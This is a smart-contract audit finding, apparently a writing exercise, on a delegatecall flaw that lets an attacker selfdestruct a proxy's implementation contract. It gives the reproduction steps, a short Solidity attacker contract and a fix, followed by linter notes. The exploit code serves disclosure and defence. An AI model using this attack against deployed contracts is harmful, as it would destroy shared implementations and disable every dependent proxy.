## The functions `callContract` and `delegatecallContract` can be manipulated to selfdestruct the implementation contract

**Severity**: High

Context:

1. [`Implementation.sol#L11-L15`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L11-L15)
2. [`Implementation.sol#L17-L21`](https://github.com/brinktrade/brink-core/blob/db0027533b228a6994acdbcb06713b5a3a3ecb38/contracts/Batched/DeployAndCall.sol#L17-L21)

The implementation contract is only deployed once and used in all proxy contracts as a fixed address that can't change after deployment. The exploit focus on `selfdestruct` the implementation contract disabling all proxy contracts.

There are few steps to reproduce the attack in implementation contract:

1. The attacker calls `callContract` in implementation contract
2. The `callContract` function calls the implementation contract again, using the `delegatecallContract` function
3. The `delegatecallContract` function delegatecall the selfdestruct function in malicious contract, here the context is implementation contract.
4. When malicious contract executes `selfdestruct` function it will destroy the implementation contract because the context is the implementation contract

The next image shows how this vulnerability works.

![`How vulnerability works`](./screenshots/how-it-works.png)

Here is an example of attacker contract that can selfdestruct the implementation contract by calling attack()

```solidity
/*
 * Function that call the exploit in implementation contract
 * impl is address of implementation contract
 */
function attack(address impl) external {
  bytes memory data = abi.encodeWithSignature(
    "delegatecallContract(address,bytes)",
    address(this),
    abi.encodeWithSignature("destruct()")
  );
  Implementation(impl).callContract(impl, data);
}

/*
 * Function to be executed in the context of implementation contract
 */
function destruct() external {
  selfdestruct(attacker);
}

```

**Recommendation**

To avoid this vulnerability, you can change the Implementation contract to `library` and remove the `payable` from functions:

```solidity
library Implementation {
  function callContract(address a, bytes calldata _calldata)
    external
    returns (bytes memory)
  {
    (bool success, bytes memory ret) = a.call{ value: msg.value }(_calldata);
    require(success);
    return ret;
  }

  function delegatecallContract(address a, bytes calldata _calldata)
    external
    returns (bytes memory)
  {
    (bool success, bytes memory ret) = a.delegatecall(_calldata);
    require(success);
    return ret;
  }
}

```

## Informational linter issues

**Severity**: Informational

Context:

1. [`Implementation.sol#L11`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L11)
2. [`Implementation.sol#L13`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L13)
3. [`Implementation.sol#L17`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L17)
4. [`Implementation.sol#L19`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L19)
5. [`Proxy.sol#L23`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Proxy.sol#L23)

There are some linter issues related to:

- Provide an error message for require [reason-string]
- Visibility modifier must be first in list of modifiers [visibility-modifier-order]

**Recommendation**:

To fix the visibility-modifier-order issue in these files: [`Implementation.sol#L11`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L11), [`Implementation.sol#L17`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L17), you need to declare first the visibility then the others modifiers. Eg:

```
function callContract(...) external payable returns (bytes memory){...}
```

To fix the reason-string issue in these files: [`Implementation.sol#L13`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L13), [`Implementation.sol#L19`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Implementation.sol#L19), [`Proxy.sol#L23`](https://github.com/spearbit-audits/writing-exercise/blob/de45a4c5b654710812e9fa29dde6e12526fe4786/contracts/Proxy.sol#L23), you need to add error message (maximum 32 bytes for gas optimization) to require functions. Eg:

```
require(a>b, "error message")
```
